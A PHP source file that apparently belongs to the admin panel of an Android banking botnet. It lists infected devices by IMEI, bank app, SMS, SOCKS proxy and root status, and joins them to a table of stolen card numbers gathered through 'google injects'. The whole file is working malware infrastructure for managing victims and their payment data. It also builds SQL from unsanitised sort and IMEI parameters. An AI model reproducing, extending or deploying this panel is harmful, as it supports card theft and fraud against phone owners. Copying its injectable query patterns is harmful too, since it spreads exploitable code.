<?php session_start();
include '../db.php';
include '../crypt.php';
include 'func.php';
if (!(isset($_SESSION['user_id']))){
    header("Location: ../index.php");
    return;  
}  
?>
<?php
if ($_GET['sort'] == ""){
    $sort = 'info2';
}else{
    $sort = $mysqli->real_escape_string($_GET['sort']);
}

$query = "SELECT * FROM `kliets` WHERE 1";    
$result = $mysqli->query($query);
$users_on_page="20";
$count = $result->num_rows;
$html = '';
$html_table = '';
$html_modal_table1 = '';
$html_modal_table2 = '';
$html_modal_table3 = '';
$html_form1 = '';
$html_bottom_links = '';

// считаем страницы
$total = ceil($count / $users_on_page);

if(empty($_GET["p"])){$_GET["p"]="1";}
$p=$mysqli->real_escape_string($_GET["p"]);

$first = $p*$users_on_page-$users_on_page;
$query2 = "SELECT * from `kliets` ORDER BY `{$sort}` DESC limit $first, $users_on_page ";
$result2 = $mysqli->query($query2);

$query = "SELECT * FROM `kliets` WHERE 1";    
$result = $mysqli->query($query);

$count = $result->num_rows;

# get info from cc_info table (new table for google injects)
$cc_info_query = "SELECT IMEI, CARD FROM `cc_info`";
$cc_info_result = array();
foreach($mysqli->query($cc_info_query) as $row){
    array_push($cc_info_result, $row);
}

if (isset($_REQUEST["imei"])) {
    $imei_req = $mysqli->real_escape_string($_REQUEST["imei"]);
    $imei_query_sql = "WHERE `IMEI` REGEXP '$imei_req'";
}
// страницы
if(empty($_GET["p"])){$_GET["p"]="1";}
$p=$mysqli->real_escape_string($_GET["p"]);
$mysqli = new mysqli($db_host,$db_user,$db_pass,$db_name);
$first = $p*$users_on_page-$users_on_page;
$query2 = "SELECT * FROM `kliets` $imei_query_sql ORDER BY `{$sort}` DESC limit $first, $users_on_page ";
$result2 = $mysqli->query($query2);


if (isset($_SESSION['botlist'])) {
    $conf = $_SESSION['botlist'];
  } else {
    $conf = array("imei" => true,
      "android" => true,
      "country" => true,
      "seller" => true,
      "online" => true,
      "lastcon" => true,
      "bankapp" => true,
      "card" => true,
      "sms" => true,
      "firstcon" => false,
      "jabber" => true,
      "bank" => false,
      "comment" => false,
      "root" => false,
      "screen" => false,
      "ip" => false,
      "number" => false,
      "socks" => false,
      "model" => false);
  }

# SELECT kliets.*, cc_info.CARD from `kliets` LEFT OUTER join cc_info on cc_info.IMEI=kliets.IMEI
$sql = "SELECT kliets.*, cc_info.CARD FROM `kliets` $imei_query_sql LEFT OUTER join cc_info on cc_info.IMEI=kliets.IMEI ORDER BY `{$sort}` DESC limit $first, $users_on_page ";
$html_table = getBigTable('botlist', $sql, $mysqli);


if ($_SESSION["wide-mode"] == "true"){
    $widemode = "checked";
} else {
    $widemode = "";
}


$html = file_get_contents("templates/botlist.tpl");
$html = str_replace('%%PLACE_TOTAL_BOTS_HERE%%', $count, $html);
$html = str_replace('%%PLACE_TABLE_HERE%%', $html_table, $html);
$html = str_replace('%%PLACE_WIDEMODE_HERE%%', $widemode, $html);
//$html = str_replace('%%PLACE_MODAL_TABLE2_HERE%%', $html_modal_table2, $html);
//$html = str_replace('%%PLACE_MODAL_TABLE3_HERE%%', $html_modal_table3, $html);
//$html = str_replace('%%PLACE_FORM1_HERE%%', $html_form1, $html);
$html = str_replace('%%PLACE_BOTTOM_LINKS_HERE%%', pages_bottom("botlist",$total,$p,$sort), $html);

# set chechboxes
foreach ($conf as $key => $value) {
    if ($value) {
        $check = "checked";
    } else {
        $check = "";
    }
    $placeholder = '%%PLACE_'.$key.'_CHECKBOX_HERE%%';
    $html = str_replace($placeholder, $check, $html);
}

echo $html;

?>
